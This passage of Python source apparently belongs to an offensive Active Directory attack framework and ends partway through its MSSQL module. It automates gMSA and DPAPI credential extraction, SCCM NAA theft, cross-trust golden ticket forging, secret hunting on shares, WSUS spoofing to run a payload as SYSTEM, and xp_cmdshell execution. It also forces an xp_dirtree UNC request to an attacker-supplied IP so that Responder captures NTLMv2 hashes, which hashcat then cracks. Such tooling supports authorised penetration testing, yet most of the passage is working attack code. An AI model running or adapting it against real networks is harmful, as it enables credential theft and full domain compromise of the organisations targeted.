                        acct = str(entry.sAMAccountName)
                        blob = entry['msDS-ManagedPassword'].raw_values
                        if blob:
                            # parse MSDS-MANAGEDPASSWORD_BLOB
                            # version(2) + reserved(2) + length(4) + currentpwd(256) + ...
                            data = blob[0]
                            if len(data) >= 20:
                                pwd_len = _struct.unpack_from('<H', data, 4)[0]
                                current_pw_off = _struct.unpack_from('<H', data, 6)[0]
                                pwd_bytes = data[current_pw_off:current_pw_off+pwd_len]
                                # derive NTLM hash from password bytes
                                import hashlib as _hl
                                ntlm = _hl.new('md4', pwd_bytes).hexdigest()
                                log(f'{GREEN}gMSA {WHITE}{acct}{GREEN} NTLM (derived): {WHITE}{ntlm}{RESET}','success')
                                ws = os.path.basename(target.loot_dir)
                                _db_save_cred(ws, target.domain, acct, hash_val=ntlm, source='gmsa-dsinternals')
                                add_result('gmsa', f'{acct} NTLM (derived): {ntlm[:16]}...')
                                found = True
                    conn.unbind()
                except ImportError:
                    log('ldap3 not found — install: pip install ldap3 --break-system-packages','error')
                    log(f'Alternative: {C0}pip install DSInternals{RESET} or use a Windows box','info')
                except Exception as e:
                    log(f'DSInternals fallback failed: {e}','error')
                    log('Manual steps:','info')
                    log(f'  1. {C0}Install-Module DSInternals{RESET} (PowerShell)','info')
                    log(f'  2. {C0}Get-ADServiceAccount -Filter * | Get-GMSAPassword{RESET}','info')

        if not found and not any([nxc,bloody,dumper,ldeep]):
            log('No gMSA tool found','error')
            log(f'Install: {WHITE}pip install gMSADumper ldeep ldap3 --break-system-packages{RESET}','info')
        hr()


# =============================================================================
# DPAPI — decrypt DPAPI blobs, masterkeys, browser creds
# =============================================================================
class DPAPI(Module):
    name='dpapi'; description='DPAPI -- decrypt masterkeys, browser creds, credential files via impacket'; category='credentials'
    def run(self, target):
        if not self.req(target): return
        t = self.need('impacket-dpapi','dpapi.py')
        if not t: return
        hr()
        action = self.ask('action','masterkey',['masterkey','credential','vault','browser','backupkey','decrypt_creds'])
        hr()
        auth, extra = target.imp_str()

        if action == 'decrypt_creds':
            log('Full DPAPI credential decrypt workflow','info')
            log('Step 1: masterkey decrypt → Step 2: credential blob decrypt','info')
            hr()
            mkf  = self.ask('masterkey file path (loot or download from target)')
            sid  = self.ask('user SID (e.g. S-1-5-21-...-1115)')
            pw   = self.ask('user password', target.password or '')
            import subprocess as _sp_dp, re as _re_dp
            r = subprocess.run([t,'masterkey','-file',mkf,'-sid',sid,'-password',pw],
                           capture_output=True, text=True)
            print(r.stdout)
            # extract decrypted key
            mk_match = re.search(r'Decrypted key:\s*(0x[0-9a-fA-F]+)', r.stdout)
            if not mk_match:
                log('Could not extract decrypted masterkey — check output above','error')
                hr(); return
            mk_key = mk_match.group(1)
            log(f'{GREEN}Masterkey: {WHITE}{mk_key[:32]}...{RESET}','success')
            # now decrypt credential blob
            cred_file = self.ask('credential blob file path')
            r2 = subprocess.run([t,'credential','-file',cred_file,'-key',mk_key],
                            capture_output=True, text=True)
            print(r2.stdout)
            # extract username/password
            user_m = re.search(r'Username\s*:\s*(.+)', r2.stdout)
            pass_m = re.search(r'Unknown\s*:\s*(\S+)\s*$', r2.stdout, re.MULTILINE)
            if not pass_m:
                pass_m = re.search(r'Unknown\s*:\s*(.+)', r2.stdout)
            if user_m and pass_m:
                cred_user = user_m.group(1).strip()
                cred_pass = pass_m.group(1).strip()
                log(f'{GREEN}Credentials: {WHITE}{cred_user}{GREEN} : {WHITE}{cred_pass}{RESET}','success')
                add_result('dpapi', f'{cred_user.split("\\")[-1]} creds decrypted')
                # save to cracked.txt
                with open(os.path.join(target.loot_dir,'cracked.txt'),'a') as _f:
                    _f.write(f'{cred_user}:{cred_pass}\n')
            else:
                log('Could not parse credentials from output','warn')
        elif action == 'masterkey':
            mkf = self.ask('masterkey file path')
            sid = self.ask('user SID')
            pw  = self.ask('user password', target.password or '')
            run_cmd([t,'masterkey','-file',mkf,'-sid',sid,'-password',pw],
                    label='dpapi masterkey')
        elif action == 'credential':
            cred_file = self.ask('credential blob file')
            mk_hash   = self.ask('decrypted masterkey hash (from masterkey step)')
            run_cmd([t,'credential','-file',cred_file,'-key',mk_hash],
                    label='dpapi credential')
        elif action == 'vault':
            vault_dir = self.ask('vault directory')
            mk_hash   = self.ask('decrypted masterkey hash')
            run_cmd([t,'vault','-directory',vault_dir,'-key',mk_hash],
                    label='dpapi vault')
        elif action == 'browser':
            log(f'Dumping browser credentials remotely via secretsdump...','info')
            sd = check_tool('impacket-secretsdump','secretsdump.py')
            if sd:
                out = os.path.join(target.loot_dir,'dpapi_browser.txt')
                run_cmd([sd]+auth+extra+['-dpapi','-outputfile',out],
                        label='secretsdump dpapi')
        elif action == 'backupkey':
            log('Getting domain DPAPI backup key (requires DA)...','info')
            bk = check_tool('impacket-dpapi','dpapi.py')
            if bk:
                out = os.path.join(target.loot_dir,'dpapi_backupkey.pvk')
                run_cmd([bk,'backupkeys','--export']+auth+extra,
                        label='dpapi backupkeys')
        hr()


# =============================================================================
# ACLSCAN — instant ACL vulnerability scan via abuseACL (no BloodHound needed)
# =============================================================================
class ACLScan(Module):
    name='aclscan'; description='abuseACL — instant LDAP-based ACL scan, find exploitable ACEs for current user or any principal'; category='recon'
    def run(self, target):
        if not self.req(target): return
        t = self.need('abuseACL')
        if not t: return
        hr()
        log(f'{C0}ACL Scanner — finds exploitable ACEs via direct LDAP{RESET}','info')
        log(f'{GREY}Faster than BloodHound — no collection needed{RESET}','info')

        mode = self.ask('mode','current',['current','principal','file','extends'])

        auth_str = f'{target.domain}/{target.user}'
        if target.password: auth_str += f':{target.password}'
        auth_target = f'{auth_str}@{target.dc}'

        out = os.path.join(target.loot_dir,'aclscan.txt')
        hr()

        if mode == 'current':
            log(f'Scanning ACEs for {WHITE}{target.user}{RESET}...','info')
            rc, out_lines = run_cmd_capture(
                [t, auth_target],
                label='abuseACL current user')
            out_data = '\n'.join(out_lines) if out_lines else ''

        elif mode == 'principal':
            principal = self.ask('principal (user/group/computer)','')
            if not principal: return
            # abuseACL needs exact name — try with domain suffix if not present
            if '@' not in principal and target.domain:
                principal_full = f'{principal}@{target.domain.upper()}'
            else:
                principal_full = principal
            log(f'Scanning ACEs for {WHITE}{principal_full}{RESET}...','info')
            rc, out_lines = run_cmd_capture(
                [t, '-principal', principal_full, auth_target],
                label=f'abuseACL {principal_full}')
            out_data = '\n'.join(out_lines) if out_lines else ''

        elif mode == 'file':
            pfile = self.ask('principals file path','')
            if not pfile or not os.path.exists(pfile):
                log('File not found','error'); return
            log(f'Scanning ACEs for principals in {WHITE}{pfile}{RESET}...','info')
            rc, out_lines = run_cmd_capture(
                [t, '-principalsfile', pfile, auth_target],
                label='abuseACL file')
            out_data = '\n'.join(out_lines) if out_lines else ''

        elif mode == 'extends':
            log(f'Scanning Schema + adminSDHolder ACEs...','info')
            rc, out_lines = run_cmd_capture(
                [t, '-extends', auth_target],
                label='abuseACL extends')
            out_data = '\n'.join(out_lines) if out_lines else ''

        # parse results (output already printed by run_cmd_capture)
        dangerous = ['GenericAll','WriteDacl','WriteOwner','GenericWrite',
                     'ForceChangePassword','AddMember','GetChangesAll','Owns']
        hits = []
        for line in out_data.splitlines():
            for right in dangerous:
                if right.lower() in line.lower():
                    hits.append(line.strip())
                    break

        if hits:
            log(f'{GREEN}{len(hits)} exploitable ACE(s) found{RESET}','success')
            for h in hits:
                print(f'  {RED}→{RESET} {h}')
            add_result('aclscan', f'{len(hits)} exploitable ACEs')
            with open(out,'w') as f:
                f.write('\n'.join(hits))
            log(f'Saved → {WHITE}{out}{RESET}','info')
            log(f'Exploit with: {C0}bloody{RESET} or {C0}pathpwn{RESET}','info')
        else:
            log('No immediately exploitable ACEs found','warn')
        hr()


# =============================================================================
# SCCM/MECM — discover, enumerate and extract NAA credentials
# =============================================================================
class SCCM(Module):
    name='sccm'; description='SCCM/MECM — discover servers, extract NAA credentials via WMI/DPAPI, PXE abuse'; category='recon'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{C0}SCCM/MECM Attack Surface{RESET}','info')
        action = self.ask('action','enum',['enum','naa','dpapi','pxe','admin'])
        hr()

        if action == 'enum':
            # discover SCCM servers via AD
            t = self.need('sccmhunter','sccmhunter.py')
            if not t:
                log(f'{GREY}sccmhunter not found — trying netexec SCCM enum{RESET}','info')
                nxc = check_tool('netexec','nxc')
                if nxc and target.dc:
                    run_cmd([nxc,'ldap',target.dc,'-u',target.user or '',
                             '-p',target.password or '',
                             '--query','(objectClass=mSSMSSite)',''],
                            label='ldap SCCM sites')
                    run_cmd([nxc,'ldap',target.dc,'-u',target.user or '',
                             '-p',target.password or '',
                             '--query','(objectClass=mSSMSManagementPoint)',''],
                            label='ldap management points')
                return
            auth = _build_auth_args(target)
            run_cmd([t,'find'] + auth + ['-d',target.domain,'-dc-ip',target.dc],
                    label='sccmhunter find')

        elif action == 'naa':
            # extract NAA credentials via WMI
            t = self.need('sccmhunter','sccmhunter.py')
            sccm_target = self.ask('SCCM server/client IP','')
            if not t or not sccm_target: return
            auth = _build_auth_args(target)
            run_cmd([t,'dpapi'] + auth + [
                '-d',target.domain,'-dc-ip',target.dc,
                '-target',sccm_target,'-wmi'],
                label='sccmhunter NAA extract (WMI)')

        elif action == 'dpapi':
            # extract via DPAPI (requires local admin on SCCM client)
            t = check_tool('SystemDPAPIdump.py','SystemDPAPIdump')
            sccm_target = self.ask('SCCM client IP','')
            if not sccm_target: return
            auth_str = f'{target.domain}/{target.user}:{target.password}'
            if target.hash:
                auth_str = f'{target.domain}/{target.user}'
                run_cmd(['python3',t or 'SystemDPAPIdump.py',
                         '-creds','-sccm',
                         f'{auth_str}:{target.hash}@{sccm_target}'],
                        label='SystemDPAPIdump SCCM DPAPI')
            else:
                run_cmd(['python3',t or 'SystemDPAPIdump.py',
                         '-creds','-sccm',
                         f'{auth_str}@{sccm_target}'],
                        label='SystemDPAPIdump SCCM DPAPI')

        elif action == 'pxe':
            # PXE boot variable extraction
            t = self.need('pxethiefy','pxethiefy.py')
            mp = self.ask('Management Point IP/hostname','')
            if not t or not mp: return
            out = os.path.join(target.loot_dir,'pxe_vars.bin')
            run_cmd(['python3',t,mp,'-o',out], label='pxethiefy PXE extract')
            log(f'If successful, crack with hashcat: {C0}hashcat -m 19850 {out} rockyou.txt{RESET}','info')

        elif action == 'admin':
            # gain SCCM admin via relay or existing DA
            t = self.need('sccmhunter','sccmhunter.py')
            sccm_target = self.ask('SCCM server IP','')
            if not t or not sccm_target: return
            auth = _build_auth_args(target)
            run_cmd([t,'admin'] + auth + [
                '-d',target.domain,'-dc-ip',target.dc,
                '-target',sccm_target],
                label='sccmhunter admin shell')
        hr()


# =============================================================================
# TRUSTS — enumerate and abuse AD trust relationships
# =============================================================================
class Trusts(Module):
    name='trusts'; description='AD trusts — enumerate trust relationships, SID history abuse, cross-forest attacks'; category='recon'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{C0}AD Trust Enumeration & Abuse{RESET}','info')
        action = self.ask('action','enum',['enum','sidhistory','golden','crossforest'])
        hr()

        if action == 'enum':
            # enumerate all trusts
            log('Enumerating domain trusts...','info')
            # via netexec
            nxc = check_tool('netexec','nxc')
            if nxc:
                run_cmd([nxc,'ldap',target.dc,
                         '-u',target.user or '','-p',target.password or '',
                         '--trusted-for-delegation'],
                        label='nxc trusted for delegation')
            # via impacket
            get_user_spns = check_tool('impacket-GetUserSPNs','GetUserSPNs.py')
            # via rpcclient
            rpc = check_tool('rpcclient')
            if rpc:
                auth = f'{target.user}%{target.password}' if target.password else '%'
                run_cmd([rpc,'-U',auth,f'//{target.dc}','-c','enumtrusts'],
                        label='rpcclient enumtrusts')
            # via PowerView equivalent — netexec
            if nxc:
                run_cmd([nxc,'ldap',target.dc,
                         '-u',target.user or '','-p',target.password or '',
                         '--query','(objectClass=trustedDomain)',
                         'name trustDirection trustType trustAttributes'],
                        label='ldap trust objects')
            # save output
            out = os.path.join(target.loot_dir,'trusts.txt')
            log(f'Trust data → {WHITE}{out}{RESET}','info')
            add_result('trusts','trust enumeration complete')

        elif action == 'sidhistory':
            # find users with SID history (potential cross-domain abuse)
            log('Searching for SID history abuse vectors...','info')
            nxc = check_tool('netexec','nxc')
            if nxc:
                run_cmd([nxc,'ldap',target.dc,
                         '-u',target.user or '','-p',target.password or '',
                         '--query','(sIDHistory=*)','name sIDHistory'],
                        label='ldap SID history search')
            # also check via bloodyAD
            bloody = check_tool('bloodyad','bloodyAD')
            if bloody:
                run_cmd([bloody,'--host',target.fqdn or target.dc,
                         '--dc-ip',target.dc,'-d',target.domain,
                         '-u',target.user or '','-p',target.password or '',
                         'get','object','*','--attr','sIDHistory'],
                        label='bloodyAD SID history')

        elif action == 'golden':
            # cross-trust golden ticket / extra SID injection
            log(f'{ORANGE}Cross-trust golden ticket — needs krbtgt hash of trusting domain{RESET}','info')
            target_domain = self.ask('target (trusted) domain','')
            extra_sid     = self.ask('extra SID (e.g. S-1-5-21-TRUSTED-DOMAIN-519)','')
            krbtgt_hash   = self.ask('krbtgt NTLM hash of current domain','')
            user          = self.ask('user to impersonate','Administrator')
            domain_sid    = self.ask('current domain SID (S-1-5-21-...)','')
            if not all([target_domain, extra_sid, krbtgt_hash, domain_sid]): return
            ticketer = check_tool('impacket-ticketer','ticketer.py')
            if not ticketer: return
            out = os.path.join(target.loot_dir,f'golden_{target_domain}.ccache')
            run_cmd([ticketer,
                     '-nthash',krbtgt_hash,
                     '-domain-sid',domain_sid,
                     '-domain',target.domain,
                     '-extra-sid',extra_sid,
                     '-spn',f'krbtgt/{target_domain}',
                     user,'-outfile',out],
                    label='golden ticket cross-trust')
            log(f'Use: {C0}export KRB5CCNAME={out}{RESET}','info')
            log(f'Then: {C0}impacket-psexec -k -no-pass {target_domain}/Administrator@TARGET{RESET}','info')

        elif action == 'crossforest':
            # cross-forest enumeration with current creds
            ext_domain = self.ask('external/trusted domain','')
            ext_dc     = self.ask('external DC IP','')
            if not ext_domain or not ext_dc: return
            log(f'Enumerating {WHITE}{ext_domain}{RESET} via trust...','info')
            nxc = check_tool('netexec','nxc')
            if nxc:
                run_cmd([nxc,'ldap',ext_dc,
                         '-u',f'{target.domain}\\{target.user}',
                         '-p',target.password or '',
                         '--users'],
                        label=f'cross-forest user enum → {ext_domain}')
                run_cmd([nxc,'ldap',ext_dc,
                         '-u',f'{target.domain}\\{target.user}',
                         '-p',target.password or '',
                         '--groups'],
                        label=f'cross-forest group enum → {ext_domain}')
            add_result('trusts',f'cross-forest enum: {ext_domain}')
        hr()


# =============================================================================
# SNAFFLER — sensitive file finder on shares
# =============================================================================
class Snaffler(Module):
    name='snaffler'; description='Snaffler — find sensitive files on network shares (passwords, keys, configs, secrets)'; category='recon'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{C0}Snaffler — sensitive file discovery{RESET}','info')
        log(f'{GREY}Finds passwords, keys, configs, scripts across all accessible shares{RESET}','info')

        t = check_tool('Snaffler','Snaffler.exe')
        win_t = os.path.join(os.path.expanduser('~/.segfault-ad/tools/win'),'Snaffler.exe')

        # check if we have a shell to run on target
        mode = self.ask('mode','local',['local','remote'])

        if mode == 'remote':
            log(f'Run via exec shell on target:','info')
            print(f'  {C0}upload ~/.segfault-ad/tools/win/Snaffler.exe{RESET}')
            print(f'  {C0}.\\Snaffler.exe -s -o C:\\Windows\\Temp\\snaffler.log -v data{RESET}')
            print(f'  {C0}# then: download C:\\Windows\\Temp\\snaffler.log{RESET}')
            hr(); return

        # local mode — run against shares via creds
        # use netexec spider as fallback if no Snaffler
        out = os.path.join(target.loot_dir,'snaffler.txt')
        nxc = check_tool('netexec','nxc')

        if not os.path.exists(win_t) and not t:
            log(f'{ORANGE}Snaffler.exe not found — using netexec spider with sensitive file patterns{RESET}','warn')
            if nxc and target.user and target.dc:
                auth = ['-u',target.user]
                if target.password: auth += ['-p',target.password]
                elif target.hash:   auth += ['-H',target.hash]
                # spider with juicy patterns
                patterns = r'(password|passwd|secret|credential|apikey|api_key|token|id_rsa|\.pfx|\.p12|web\.config|appsettings|\.env|unattend|sysprep|vnc|\.kdbx|\.keytab)'
                rc, out_lines = run_cmd_capture(
                    [nxc,'smb',target.dc]+auth+[
                        '--spider','C$','--pattern',patterns,'--regex'],
                    label='nxc spider sensitive files')
                hits = [l for l in out_lines if any(x in l.lower() for x in
                        ['password','secret','credential','api','token','rsa','pfx','config','env','vnc','kdbx'])]
                if hits:
                    with open(out,'w') as f: f.write('\n'.join(hits))
                    log(f'{GREEN}{len(hits)} sensitive file(s) found → {WHITE}{out}{RESET}','success')
                    for h in hits[:20]: print(f'  {PINK}→{RESET} {h}')
                    add_result('snaffler',f'{len(hits)} sensitive files')
                else:
                    log('No sensitive files found via spider','warn')
            hr(); return

        # run Snaffler.exe locally via wine or upload
        auth_args = []
        if target.user:     auth_args += ['-d',target.domain,'-u',target.user]
        if target.password: auth_args += ['-p',target.password]
        if target.hash:     auth_args += ['-h',target.hash]

        cmd = [t or win_t, '-s', '-o', out, '-v', 'data'] + auth_args
        run_cmd(cmd, label='Snaffler')

        if os.path.exists(out) and os.path.getsize(out) > 0:
            lines = open(out).read().splitlines()
            log(f'{GREEN}{len(lines)} finding(s) → {WHITE}{out}{RESET}','success')
            add_result('snaffler', f'{len(lines)} findings')
        hr()


# =============================================================================
# PYWSUS — WSUS update spoofing → SYSTEM
# =============================================================================
class PyWSUS(Module):
    name='pywsus'; description='pyWSUS — WSUS update spoofing, serve malicious update to machines pulling from WSUS server'; category='exploitation'
    def run(self, target):
        if not self.req(target): return
        hr()
        log(f'{C0}pyWSUS — WSUS update spoofing{RESET}','info')
        log(f'{GREY}If target uses WSUS, spoof update → SYSTEM on any machine pulling updates{RESET}','info')

        t = check_tool('pywsus','pywsus.py')
        if not t:
            log(f'pywsus not found — install: {C0}pip install pywsus{RESET}','error')
            hr(); return

        action = self.ask('action','check',['check','serve'])

        if action == 'check':
            # detect WSUS server via LDAP
            nxc = check_tool('netexec','nxc')
            if nxc and target.dc and target.user:
                auth = ['-u',target.user]
                if target.password: auth += ['-p',target.password]
                elif target.hash:   auth += ['-H',target.hash]
                log('Checking for WSUS server in AD...','info')
                run_cmd_capture([nxc,'ldap',target.dc]+auth+[
                    '--query','(objectClass=mswsusservers)','cn dNSHostName'],
                    label='ldap WSUS discovery')
            log('Also check: registry key on targets','info')
            print(f'  {C0}reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer{RESET}')

        elif action == 'serve':
            lhost = self.ask('your IP (lhost)', _get_tun0() or _hivemind_redirector() or '')
            port  = self.ask('port','8530')
            payload = self.ask('payload path (exe to execute as SYSTEM)','')
            if not lhost or not payload: hr(); return
            log(f'{ORANGE}Starting WSUS spoofer on {lhost}:{port}{RESET}','warn')
            log(f'{GREY}Point target machines to http://{lhost}:{port} as WSUS server{RESET}','info')
            run_cmd(['python3',t,'--host',lhost,'--port',port,'--exe',payload],
                    label='pywsus serve')
        hr()


# =============================================================================
# MSSQL — enumerate and abuse SQL Server
# =============================================================================
class MSSQL(Module):
    name='mssql'; description='MSSQL -- enum instances, xp_cmdshell, linked servers, UNC injection'; category='recon'
    def run(self, target):
        if not self.req(target): return
        nxc = self.need('netexec','nxc','crackmapexec','cme')
        if not nxc: return
        hr()
        action = self.ask('action','enum',['enum','cmd','linked','hash','privesc'])
        t_host = self.ask('target',target.dc)
        auth_mode = self.ask('auth mode','sql',['sql','windows'])
        hr()
        base    = [nxc,'mssql',t_host]+target.nxc_args()
        mssqlc  = check_tool('impacket-mssqlclient','mssqlclient.py')

        def _mssql_auth():
            u = target.user or ''
            p = target.password or ''
            host_str = target.dc_fqdn or t_host
            if auth_mode == 'windows':
                domain = target.domain or '.'
                return [mssqlc, f'{domain}/{u}:{p}@{host_str}', '-windows-auth']
            else:
                return [mssqlc, f'{u}:{p}@{host_str}']

        if action == 'enum':
            # use local auth for SQL accounts, no domain prefix
            local_auth = self.ask('use local auth (for SQL accounts)?','y',['y','n'])
            base_auth = [nxc,'mssql',t_host,'-u',target.user,'-p',target.password or '']
            if local_auth == 'y':
                base_auth += ['--local-auth']
            run_cmd(base_auth, label='mssql enum')
            # also try rid brute via mssql
            rid = self.ask('enumerate domain users via RID brute?','y',['y','n'])
            if rid == 'y':
                import re as _re_rid, subprocess as _sp_rid
                log('mssql rid-brute','info')
                log(f'{GREY}{" ".join(str(c) for c in base_auth+["--rid-brute"])}{RESET}','info')
                hr()
                r_rid = subprocess.run(base_auth+['--rid-brute'], text=True, capture_output=True)
                print(r_rid.stdout)
                users_found = []
                _groups = {'Domain Admins','Domain Users','Domain Computers','Domain Controllers',
                    'Schema Admins','Enterprise Admins','Group Policy Creator Owners','Protected Users',
                    'Key Admins','Enterprise Key Admins','Helpdesk','IT','Finance','DnsAdmins',
                    'DnsUpdateProxy','Cert Publishers','RAS and IAS Servers','Read-only Domain Controllers',
                    'Cloneable Domain Controllers','Allowed RODC Password Replication Group',
                    'Denied RODC Password Replication Group','Enterprise Read-only Domain Controllers',
                    'SQLServer2005SQLBrowserUser$WIN-Q13O908QBPG'}
                for line in r_rid.stdout.splitlines():
                    # match everything after DOMAIN\ until end of line
                    m = re.search(r'\d+:\s+\S+\\(.+?)(?:\s*$)', line)
                    if not m: continue
                    u = m.group(1).strip()
                    if u.endswith('$'): continue
                    if u in _groups: continue
                    if u.lower() in ('administrator','guest','krbtgt'): continue
                    if ' ' in u: continue  # skip groups with spaces
                    users_found.append(u)
                if users_found:
                    ufile = os.path.join(target.loot_dir, 'users.txt')
                    ffile = os.path.join(target.loot_dir, 'users_fqdn.txt')
                    os.makedirs(target.loot_dir, exist_ok=True)
                    existing = set(open(ufile, errors='replace').read().splitlines()) if os.path.exists(ufile) else set()
                    new_u = [u for u in users_found if u not in existing]
                    if new_u:
                        with open(ufile,'a') as f:
                            for u in new_u: f.write(u+'\n')
                        with open(ffile,'a') as f:
                            for u in new_u: f.write(f'{u}@{target.domain}\n')
                    hr()
                    log(f'{GREEN}RID brute complete — {len(users_found)} user(s) found{RESET}','success')
                    log(f'Saved → {WHITE}{ufile}{RESET}','success')
                    log(f'FQDN  → {WHITE}{ffile}{RESET}','success')
                    for u in users_found: print(f'  {C0}{u}{RESET}')
                else:
                    log('No users found in rid-brute output','warn')
        elif action == 'cmd':
            log('Execute commands via xp_cmdshell','info')
            if not mssqlc: log('impacket-mssqlclient required','error'); hr(); return
            cmd_r = self.ask('command to run (blank = interactive shell)','')
            auth  = f'{target.domain}/{target.user}:{target.password}@{t_host}' if target.password \
                    else f'{target.domain}/{target.user}@{t_host}'
            if cmd_r:
                queries = [
                    "EXEC sp_configure 'show advanced options',1; RECONFIGURE;",
                    "EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;",
                    f"EXEC xp_cmdshell '{cmd_r}';",
                ]
                for q in queries:
                    log(f'{GREY}SQL> {q[:80]}{RESET}','info')
                proc = subprocess.Popen(_mssql_auth(),
                                       stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                       stderr=subprocess.STDOUT, text=True, errors='replace')
                try:
                    full_q = '\n'.join(queries) + '\nexit\n'
                    out, _ = proc.communicate(input=full_q, timeout=15)
                    for l in out.splitlines():
                        if l.strip() and 'Impacket' not in l:
                            print(f'  {WHITE}{l}{RESET}')
                except subprocess.TimeoutExpired:
                    proc.kill()
                add_result('mssql', f'xp_cmdshell: {cmd_r[:30]}')
            else:
                log('Opening interactive mssqlclient shell...','info')
                log(f'{GREY}Tips: enable_xp_cmdshell, xp_cmdshell whoami, exit{RESET}','info')
                subprocess.call(_mssql_auth())

        elif action == 'linked':
            log('Enumerate and exploit linked servers','info')
            if not mssqlc: log('impacket-mssqlclient required','error'); hr(); return
            auth = f'{target.domain}/{target.user}:{target.password}@{t_host}' if target.password \
                   else f'{target.domain}/{target.user}@{t_host}'
            log('Enumerating linked servers...','info')
            enum_q = "SELECT name,provider,data_source FROM sys.servers WHERE is_linked=1;\nexit\n"
            proc = subprocess.Popen(_mssql_auth(),
                                   stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                   stderr=subprocess.STDOUT, text=True, errors='replace')
            try:
                out, _ = proc.communicate(input=enum_q, timeout=15)
                linked_servers = []
                for l in out.splitlines():
                    if '|' in l and 'name' not in l.lower() and l.strip():
                        parts = [p.strip() for p in l.split('|')]
                        if parts[0]: linked_servers.append(parts[0])
                    print(f'  {C0}{l}{RESET}') if l.strip() else None
            except subprocess.TimeoutExpired:
                proc.kill(); linked_servers = []

            if linked_servers:
                log(f'{GREEN}{len(linked_servers)} linked server(s) found{RESET}','success')
                srv   = self.ask('target linked server', linked_servers[0])
                cmd_r = self.ask('command to run on linked server','whoami')
                linked_q = (
                    f"EXEC ('sp_configure ''show advanced options'',1; reconfigure;') AT [{srv}];\n"
                    f"EXEC ('sp_configure ''xp_cmdshell'',1; reconfigure;') AT [{srv}];\n"
                    f"EXEC ('xp_cmdshell ''{cmd_r}'';') AT [{srv}];\n"
                    f"exit\n"
                )
                proc2 = subprocess.Popen(_mssql_auth(),
                                        stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                        stderr=subprocess.STDOUT, text=True, errors='replace')
                try:
                    out2, _ = proc2.communicate(input=linked_q, timeout=20)
                    for l in out2.splitlines():
                        if l.strip() and 'Impacket' not in l:
                            print(f'  {GREEN if "NT AUTHORITY" in l or chr(92) in l else WHITE}{l}{RESET}')
                except subprocess.TimeoutExpired:
                    proc2.kill()
                add_result('mssql', f'linked exec: {srv}')
            else:
                log('No linked servers — try interactive: mssql cmd','info')

        elif action == 'hash':
            import socket as _sk, threading as _th, re as _re2
            # auto-detect tun0 IP
            def _tun0():
                try:
                    import fcntl, struct
                    s = _sk.socket(_sk.AF_INET, _sk.SOCK_DGRAM)
                    ip = _sk.inet_ntoa(fcntl.ioctl(s.fileno(),0x8915,struct.pack('256s',b'tun0'))[20:24])
                    s.close(); return ip
                except Exception: return ''
            lhost = self.ask('your IP (for UNC capture)', _hivemind_redirector() or _tun0() or '');
            if _hivemind_redirector() and lhost == _hivemind_redirector(): log(f'Using Hivemind redirector: {WHITE}{lhost}{RESET}','info')
            if not lhost: log('IP required','error'); hr(); return
            mssql_user = self.ask('mssql username', target.user or '')
            mssql_pass = self.ask('mssql password', target.password or '')
            if not mssql_user: log('Username required','error'); hr(); return
            iface = self.ask('responder interface','tun0')
            resp  = check_tool('responder','Responder.py')
            out_file = os.path.join(target.loot_dir, 'responder_hashes.txt')
            resp_proc = None
            if resp:
                log(f'{GREEN}Starting Responder on {iface}...{RESET}','success')
                resp_proc = subprocess.Popen(
                    ['sudo', resp, '-I', iface, '-v'],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                import time; time.sleep(2)
                log('Responder running — triggering xp_dirtree...','info')
            else:
                log(f'{ORANGE}Responder not found — start manually: sudo responder -I {iface}{RESET}','warn')
                input('  Press Enter when Responder is running...')
            # trigger UNC auth via impacket-mssqlclient
            u = mssql_user
            p = mssql_pass
            if mssqlc and u and p:
                query = f"EXEC xp_dirtree '\\\\{lhost}\\share';\nexit\n"
                log(f'Triggering xp_dirtree as {WHITE}{u}{RESET} via impacket-mssqlclient...','info')
                if auth_mode == 'windows':
                    # use FQDN hostname for Windows auth — IP fails
                    host_str = target.dc_fqdn or t_host
                    mssql_cmd = [mssqlc, f'{target.domain or "."}/{u}:{p}@{host_str}', '-windows-auth']
                else:
                    # SQL auth — use hostname not IP if available
                    host_str = target.dc_fqdn or t_host
                    mssql_cmd = [mssqlc, f'{u}:{p}@{host_str}']
                proc = subprocess.Popen(mssql_cmd,
                    stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT, text=True)
                try:
                    out, _ = proc.communicate(input=query, timeout=15)
                    for l in out.splitlines()[:10]:
                        print(f'  {GREY}{l}{RESET}')
                except subprocess.TimeoutExpired:
                    proc.kill()
                    log('xp_dirtree sent — check Responder output above','success')
            elif mssqlc and u:
                auth  = f'{u}@{t_host}'
                query = f"EXEC xp_dirtree '\\\\{lhost}\\share';\nexit\n"
                proc = subprocess.Popen(
                    [mssqlc, auth, '-no-pass'],
                    stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT, text=True)
                try:
                    out, _ = proc.communicate(input=query, timeout=15)
                    for l in out.splitlines()[:10]:
                        print(f'  {GREY}{l}{RESET}')
                except subprocess.TimeoutExpired:
                    proc.kill()
            else:
                log('Set username/password first — run: set','error')
            import time; time.sleep(3)
            # capture hashes from Responder output
            hashes = []
            if resp_proc:
                try:
                    resp_proc.terminate()
                    out, _ = resp_proc.communicate(timeout=3)
                    for line in out.splitlines():
                        if 'NTLMv2' in line or '::' in line:
                            hashes.append(line.strip())
                except Exception: pass
            # also check Responder logs
            resp_log_dirs = ['/usr/share/responder/logs', '/opt/responder/logs',
                             os.path.expanduser('~/responder/logs')]
            for d in resp_log_dirs:
                for f in (os.listdir(d) if os.path.isdir(d) else []):
                    if 'NTLMv2' in f or 'Hash' in f:
                        try:
                            content = open(os.path.join(d,f)).read()
                            hashes.extend([l for l in content.splitlines() if '::' in l])
                        except Exception: pass
            if hashes:
                unique = list(dict.fromkeys(hashes))
                with open(out_file,'w') as f:
                    for h in unique: f.write(h+'\n')
                log(f'{GREEN}{len(unique)} hash(es) captured → {WHITE}{out_file}{RESET}','success')
                for h in unique: print(f'  {PINK}{h[:100]}{RESET}')
                hr()
                print(f'  {WHITE}hashcat -m 5600 {out_file} rockyou.txt{RESET}')
            else:
                log(f'No hashes captured — check Responder logs manually','warn')
                log(f'Responder logs: {WHITE}/usr/share/responder/logs/{RESET}','info')
        elif action == 'privesc':
            log('MSSQL privilege escalation — impersonation + trustworthy DB abuse','info')
